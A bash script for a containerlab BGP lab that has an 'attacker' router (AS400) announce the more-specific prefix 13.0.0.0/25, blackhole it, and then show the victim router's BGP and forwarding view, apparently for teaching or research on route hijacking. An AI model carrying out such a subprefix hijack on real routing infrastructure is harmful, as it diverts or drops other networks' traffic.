#!/bin/bash
# Start subprefix hijack (13.0.0.0/25) from attacker (AS400).
set -euo pipefail

find_node() {
  local suffix="$1"
  docker ps --format '{{.Names}}' | grep -E '^clab-.*-'"${suffix}"'$' | head -n1
}

R1="$(find_node r1)"
R4="$(find_node r4)"

if [ -z "$R1" ] || [ -z "$R4" ]; then
  echo "[ERROR] Lab containers not running. Deploy a topology first (containerlab deploy), then retry."
  exit 1
fi

echo "[INFO] R1=$R1"
echo "[INFO] R4=$R4"
echo "[INFO] Announcing 13.0.0.0/25 from AS400 (subprefix hijack)"

docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "network 13.0.0.0/25" \
  -c "end" >/dev/null 2>&1 || true

docker exec "$R4" ip route add blackhole 13.0.0.0/25 2>/dev/null || true

sleep 12

echo "[INFO] R1 BGP view for /25:" 
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/25" || true

echo "[INFO] R1 forwarding decision for /25:" 
docker exec "$R1" vtysh -c "show ip route 13.0.0.0/25" || true
